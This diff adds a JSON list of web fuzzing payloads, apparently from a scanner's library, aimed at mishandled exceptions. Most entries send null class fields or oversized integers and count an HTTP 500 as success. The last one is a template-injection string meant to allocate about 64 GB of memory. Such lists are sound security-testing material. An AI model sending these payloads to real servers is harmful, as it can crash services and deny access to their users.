@@ -1,0 +1,79 @@
+[
+  {
+    "payload_id": "OWP-250176",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"Cls\":\"null\",\"A\":\"B\"}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  },
+  {
+    "payload_id": "OWP-250177",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"Class\":\"null\",\"A\":\"B\"}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  },
+  {
+    "payload_id": "OWP-250178",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"Klass\":\"null\",\"A\":\"B\"}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  },
+  {
+    "payload_id": "OWP-250179",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"Kind\":\"null\",\"A\":\"B\"}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  },
+  {
+    "payload_id": "OWP-250180",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"Length\":999999999999}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  },
+  {
+    "payload_id": "OWP-250181",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"Count\":999999999999}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  },
+  {
+    "payload_id": "OWP-400820",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Null/Type/Zero Errors)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{% print 'x' * 64 * 1024**3 %}",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "exception|error|type"
+    }
+  }
+]
